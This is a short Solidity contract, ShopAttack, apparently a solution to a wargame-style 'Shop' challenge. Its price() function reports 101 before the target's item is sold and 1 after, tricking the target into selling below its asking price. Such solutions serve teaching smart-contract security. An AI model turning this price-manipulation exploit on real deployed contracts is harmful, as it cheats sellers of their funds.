// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import { Shop } from './Shop.sol';

contract ShopAttack {
    Shop target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function attack() external {
        target.buy();
    }

    function price() external view returns(uint256) {
        return target.isSold()? 1: 101;
    }
}